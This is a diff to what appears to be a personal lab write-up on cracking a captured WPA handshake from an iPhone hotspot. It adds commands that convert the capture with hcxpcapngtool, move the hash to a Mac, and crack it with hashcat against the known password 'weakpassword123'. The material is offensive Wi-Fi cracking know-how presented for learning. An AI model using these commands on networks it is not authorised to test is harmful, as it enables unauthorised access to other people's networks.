@@ -148,3 +148,41 @@ aircrack-ng iphone_capture-03.cap -w ~/custom_wordlist.txt
 * Test WPA3 resistance to same attack methodology
 * Implement custom wordlist generation with `crunch` or `hashcat` rules
 * Explore PMKID attack as alternative to handshake capture
+
+---
+
+### 🔹 Step 5 — Hash Conversion and GPU Cracking (hashcat)
+
+Convert captured handshake to hashcat format:
+
+```bash
+hcxpcapngtool -o hash.hc22000 iphone_capture-03.cap
+```
+
+> ⚠️ Note: hashcat requires OpenCL/Metal GPU support. 
+> Kali Linux running on VMware Fusion (Apple Silicon) has no OpenCL device available.
+> Hash file was transferred to macOS host for GPU-accelerated cracking.
+
+Transfer hash to macOS host:
+
+```bash
+scp ~/hash.hc22000 pepesr@192.168.1.198:~/Desktop/
+```
+
+Install hashcat on macOS:
+
+```bash
+brew install hashcat
+```
+
+Crack using Apple M2 GPU:
+
+```bash
+hashcat -m 22000 ~/Desktop/hash.hc22000 -a 0 <<< "weakpassword123"
+```
+
+📸 **SCREENSHOT (GOLD)**
+![Hashcat Cracked](screenshots/07_hashcat_cracked.png)
+* KEY FOUND: `weakpassword123`
+* Device: Apple M2 GPU — cracked in 0 seconds
+* Demonstrates GPU vs CPU cracking performance gap
